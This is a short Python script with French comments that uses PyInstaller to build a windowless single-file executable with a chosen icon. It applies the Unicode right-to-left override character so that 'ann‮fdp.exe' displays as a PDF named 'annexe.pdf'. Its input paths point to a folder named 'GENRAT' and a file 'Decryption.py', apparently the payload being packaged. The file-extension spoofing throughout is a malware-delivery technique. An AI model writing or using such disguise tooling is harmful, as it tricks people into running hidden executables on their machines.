import subprocess
import sys
import os

# Fonction pour générer un fichier .exe à partir d'un script Python
def create_exe(input_file, exe_name=None, icon_path=None):
    try:
        # Vérifiez si PyInstaller est installé, sinon installez-le
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])

        # Appliquer le caractère Unicode RLO pour inverser l'affichage du nom
        if exe_name:
            rlo = "\u202E"  # Caractère RLO pour inverser visuellement l'écriture
            exe_name = f"ann{rlo}fdp.exe"

        # Commande PyInstaller pour créer l'exécutable
        command = [
            sys.executable,
            "-m", "PyInstaller",
            "--onefile",   # Crée un fichier exécutable unique
            "--noconsole"  # Supprime la fenêtre de console si c'est une application GUI
        ]

        # Ajoutez l'option --name si un nom personnalisé est fourni
        if exe_name:
            command.extend(["--name", exe_name])

        # Ajoutez l'option pour définir l'icône
        if icon_path and os.path.exists(icon_path):
            command.extend(["--icon", icon_path])

        # Ajoutez le fichier d'entrée
        command.append(input_file)

        # Exécuter la commande PyInstaller
        subprocess.check_call(command)

        print(f"L'exécutable '{exe_name}' a été généré avec succès avec l'icône {icon_path} !")

    except subprocess.CalledProcessError as e:
        print(f"Une erreur est survenue lors de l'exécution de PyInstaller: {e}")
    except Exception as e:
        print(f"Une erreur inattendue est survenue: {e}")


# Exemple d'utilisation
if __name__ == "__main__":
    # Chemin vers le fichier Python que tu souhaites transformer en .exe
    input_file = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\Decryption.py"  # Remplace par ton fichier .py
    exe_name = "annpdf"  # Nom réel du fichier
    icon_path = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\def.ico"  # Remplace par le chemin de ton icône au format .ico
    create_exe(input_file, exe_name, icon_path)
